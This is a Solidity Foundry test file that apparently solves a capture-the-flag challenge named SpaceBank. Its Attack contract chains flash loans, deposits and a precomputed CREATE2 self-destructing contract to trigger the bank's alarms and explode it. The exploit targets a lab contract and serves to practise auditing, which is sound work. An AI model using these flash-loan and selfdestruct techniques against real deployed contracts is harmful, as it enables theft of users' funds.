// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import "src/spaceBank/Challenge.sol";
import "src/spaceBank/SpaceBank.sol";

import "@openzeppelin/contracts/utils/Create2.sol";

contract Attack {
    Challenge challenge;
    SpaceBank spacebank;
    SpaceToken token;
    uint256 counter;

    constructor(address _challenge) payable {
        challenge = Challenge(_challenge);
        spacebank = challenge.SPACEBANK();
        token = SpaceToken(address(spacebank.token()));
        token.approve(address(spacebank), type(uint256).max);
    }

    function test() external payable returns (uint256) {
        return 100;
    }

    function kill() external payable {
        uint256 tokenBalance = token.balanceOf(address(spacebank));
        if (tokenBalance == 0) {
            spacebank.explodeSpaceBank();
            return;
        }
        if (tokenBalance >= 501) {
            spacebank.flashLoan(501, address(this));
        }
        if (tokenBalance == 499) {
            spacebank.flashLoan(499, address(this));
        }
        if (spacebank.balances(address(this)) > 0) spacebank.withdraw(spacebank.balances(address(this)));
    }

    function executeFlashLoan(uint256 amountIn) external {
        uint256 solverNumber = block.number % 47;
        // emergentcy alarm 1
        if (amountIn == 501) {
            //solverNumber that solverNumber = block.number %47

            bytes memory data = abi.encodePacked(solverNumber);
            spacebank.deposit(501, data);
            return;
        }

        // emergentcy alarm 2

        bytes memory deployCode = type(Death).creationCode;
        address newTarget = Create2.computeAddress(bytes32(block.number), keccak256(deployCode), address(spacebank));
        console.log("predict address", newTarget);
        // token.transfer(newTarget, 10);
        payable(newTarget).transfer(1);
        spacebank.deposit(499, deployCode);
    }

    function selfKill() external {
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {}
}

contract Death {
    constructor() {
        selfdestruct(payable(msg.sender));
    }
}

contract BankerTest is Test {
    SpaceBank public spacebank;
    Challenge challenge;
    SpaceToken token;

    function setUp() public {
        token = new SpaceToken();

        spacebank = new SpaceBank(address(token));

        token.mint(address(spacebank), 1000);

        challenge = new Challenge(spacebank);
    }

    function _testSolve() public {
        Attack attack = new Attack(address(challenge));
        attack.kill{value: 1 wei}();

        vm.roll(block.number + 2);
        spacebank.explodeSpaceBank();

        require(challenge.isSolved(), "not solve challenge");
    }
}
